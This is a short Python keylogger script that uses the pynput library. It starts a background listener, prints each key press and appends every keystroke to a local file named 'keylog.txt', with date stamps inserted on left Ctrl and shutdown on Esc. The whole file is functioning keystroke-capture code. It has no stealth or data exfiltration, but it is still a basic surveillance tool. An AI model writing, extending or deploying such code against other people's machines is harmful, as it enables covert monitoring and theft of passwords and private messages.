from pynput.keyboard import Key,Listener
import datetime
import threading

class KeyboardLogger:
    def __init__(self):
        threading.Thread(target=self.run).start()
        
    def on_press(self,key):
        print("{0} pressed".format(key))
        self.write_file(key)
            
    def write_file(self,key):
        with open("keylog.txt" , "a" , encoding="utf-8") as file:
            k = str(key).replace("'", "")
            if k.find("enter")>0:
                file.write("\n")
            elif k.find("space")>0:
                file.write(" ")
            elif k.find("ctrl_l")>0:
                y = self.date_info()
                file.write(y)
            elif k.find("Key"):
                file.write(k)
    def date_info(self):
        return " ---------TARİH ------- " + "\n" + str(datetime.datetime.now())

    def on_release(self,key):
        if key == Key.esc:
            print("exit")
            return False

    def run(self):
        listener = Listener(on_press = self.on_press, on_release = self.on_release)
        listener.start()
        listener.join()
        
if __name__ =='__main__':
    KeyboardLogger()
